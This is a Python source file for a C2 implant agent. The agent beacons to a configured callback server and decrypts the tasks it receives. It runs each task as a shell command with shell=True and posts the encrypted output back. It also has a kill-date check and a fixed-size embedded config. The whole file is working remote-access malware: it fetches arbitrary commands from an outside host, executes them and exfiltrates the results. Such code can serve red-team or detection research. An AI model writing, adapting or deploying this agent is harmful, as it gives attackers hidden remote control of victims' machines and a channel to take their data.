#!/usr/bin/env python3
"""
Python endpoint agent implementation.
Handles encrypted C2 communication and command execution.
"""

import json
import subprocess
import time
import uuid
from typing import Dict, Any, Optional
import requests
import logging

from crypto_utils import decrypt_message, encrypt_message, decode_key_b64
from config_manager import unpack_config


# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def execute_command(command: str) -> str:
    """Execute shell command and return output."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout
        if result.stderr:
            output += f"\nSTDERR: {result.stderr}"
        if result.returncode != 0:
            output += f"\nReturn code: {result.returncode}"
            
        return output.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command execution failed: {str(e)}"


def make_callback_request(callback_url: str, deploy_id: str) -> Optional[str]:
    """Make GET request to C2 server for tasks."""
    try:
        params = {"deploy_id": deploy_id}
        response = requests.get(callback_url, params=params, timeout=10)
        
        if response.status_code == 200:
            return response.text
        elif response.status_code == 204:
            # No tasks available
            return None
        else:
            logger.warning(f"Callback request failed with status {response.status_code}")
            return None
            
    except requests.RequestException as e:
        logger.error(f"Callback request failed: {e}")
        return None


def send_response(callback_url: str, response_data: Dict[str, Any], c2_pub_key: bytes, agent_priv_key: bytes) -> bool:
    """Send encrypted response back to C2 server."""
    try:
        # Encrypt response
        response_json = json.dumps(response_data)
        encrypted_response = encrypt_message(response_json, c2_pub_key, agent_priv_key)
        
        # Send POST request
        response = requests.post(
            callback_url,
            data=encrypted_response,
            headers={"Content-Type": "text/plain"},
            timeout=10
        )
        
        return response.status_code == 200
        
    except Exception as e:
        logger.error(f"Failed to send response: {e}")
        return False


def run_agent(config_data: bytes) -> None:
    """Main agent execution loop."""
    try:
        # Unpack configuration
        agent_pub_key, agent_priv_key, config = unpack_config(config_data)
        
        # Extract configuration values
        deploy_id = config["deploy_id"]
        interval = int(config["interval"]) / 1000.0  # Convert ms to seconds
        callback_url = config["callback"]
        c2_pub_key = decode_key_b64(config["c2_pub_key"])
        kill_epoch = int(config["kill_epoch"])
        
        logger.info(f"Agent started - Deploy ID: {deploy_id}, Interval: {interval}s")
        
        while True:
            # Check kill epoch
            current_time = int(time.time())
            if current_time >= kill_epoch:
                logger.info("Kill epoch reached, terminating agent")
                break
            
            # Make callback request
            encrypted_task = make_callback_request(callback_url, deploy_id)
            
            if encrypted_task:
                try:
                    # Decrypt task
                    task_json = decrypt_message(encrypted_task, c2_pub_key, agent_priv_key)
                    task = json.loads(task_json)
                    
                    task_id = task["task_id"]
                    task_num = task["task_num"]
                    task_arg = task["task_arg"]
                    
                    logger.info(f"Received task {task_id}: {task_arg}")
                    
                    # Execute command
                    output = execute_command(task_arg)
                    
                    # Prepare response
                    response_data = {
                        "task_id": task_id,
                        "task_num": task_num,
                        "task_result": output
                    }
                    
                    # Send encrypted response
                    success = send_response(callback_url, response_data, c2_pub_key, agent_priv_key)
                    
                    if success:
                        logger.info(f"Response sent for task {task_id}")
                    else:
                        logger.error(f"Failed to send response for task {task_id}")
                        
                except Exception as e:
                    logger.error(f"Task processing failed: {e}")
            
            # Sleep until next callback
            time.sleep(interval)
            
    except Exception as e:
        logger.error(f"Agent execution failed: {e}")
        raise


def main() -> None:
    """Main entry point - loads embedded config and runs agent."""
    # In a real implementation, this would read from embedded binary data
    # For testing, we'll look for a config file
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python agent.py <config_file>")
        sys.exit(1)
    
    config_file = sys.argv[1]
    
    try:
        with open(config_file, 'rb') as f:
            config_data = f.read()
        
        if len(config_data) != 528:
            print(f"Error: Config file must be exactly 528 bytes, got {len(config_data)}")
            sys.exit(1)
        
        run_agent(config_data)
        
    except FileNotFoundError:
        print(f"Error: Config file '{config_file}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()